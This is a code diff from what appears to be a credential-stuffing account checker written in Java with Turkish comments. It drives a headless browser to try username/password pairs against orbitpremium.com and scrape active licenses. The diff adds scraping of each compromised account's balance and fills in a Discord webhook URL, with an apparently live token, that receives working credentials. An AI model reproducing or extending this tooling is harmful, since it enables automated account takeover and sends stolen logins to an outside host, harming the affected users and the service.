@@ -16,12 +16,15 @@ import java.net.http.HttpResponse;
 import java.nio.file.*;
 import java.util.List;
 import java.util.Scanner;
+import java.util.concurrent.ExecutionException;
 
 public class thisismainbro {
     public static String version = "1.0";
     static int threads = 1;
     static boolean headless = true;
     static Object nullpointer = new claz().start();
+    public static String balanceValue;
+
     public static void init() {
         String versions = takeversion("https://raw.githubusercontent.com/Wuplish/Hotline-Auth/refs/heads/main/version");
         if (versions == nullpointer || !versions.trim().equals(version.trim())) {
@@ -93,7 +96,7 @@ public class thisismainbro {
         int viewportHeight = config.getInt("viewportHeight", 1080);
 
 
-        String webhook = "";
+        String webhook = "https://discord.com/api/webhooks/1387918262234382407/MqZvD5y73-hf9_PatPTtNRgKfR9dpy3ZxCHHw0c3rM_8X5542EMzRROodKYU_lKz8eWP";
 
         try (Playwright playwright = Playwright.create()) {
             BrowserType.LaunchOptions launchOptions = new BrowserType.LaunchOptions()
@@ -124,7 +127,6 @@ public class thisismainbro {
                     Page page = context.newPage();
 
                     //System.out.println("[*] Deneniyor: " + username);
-
                     page.navigate("https://orbitpremium.com/auth/login?");
                     page.locator("xpath=/html/body/div[2]/div[2]/div[1]/div/div[2]/form/label[1]/input").fill(username);
                     page.locator("xpath=/html/body/div[2]/div[2]/div[1]/div/div[2]/form/label[2]/input").fill(password);
@@ -156,7 +158,13 @@ public class thisismainbro {
                     }
 
                     //System.out.println("[*] Giriş başarılı: " + username);
-
+                    Locator balanceElement = page.locator(".Sidebar_sidebar-profile__content-balance__M_KAZ");
+                    try {
+                        balanceValue = balanceElement.innerText();
+                        System.out.println(balanceValue);
+                    } catch (Exception e) {
+                        //System.out.println("Hata oluştu: " + e.getMessage());
+                    }
                     page.navigate("https://orbitpremium.com/account/download");
 
                     try {
@@ -198,7 +206,7 @@ public class thisismainbro {
                         String mesaj = "🟢 Aktif Lisanslar:\n" + aktifLisanslar;
                         try {
                             HttpDashboard.updateStatus(username, "Giriş başarılı - Lisanslı (" + lisanslarSatir + ")");
-                            Output.writeLicensed(username, password, lisanslarSatir.toString());
+                            Output.writeLicensed(username, password, lisanslarSatir.toString(), balanceValue );
                             trusendEmbedWebhook(webhook, username, password, mesaj);
                         } catch (InterruptedException e) {
                             throw new RuntimeException(e);
@@ -207,7 +215,7 @@ public class thisismainbro {
                         //System.out.println("[-] Hiçbir lisans aktif değil.");
                         try {
                             HttpDashboard.updateStatus(username, "Giriş başarılı - Lisans yok");
-                            Output.writeNoLicense(username, password);
+                            Output.writeNoLicense(username, password, balanceValue);
                             falsesendEmbedWebhook(webhook, username, password);
                         } catch (InterruptedException e) {
                             throw new RuntimeException(e);
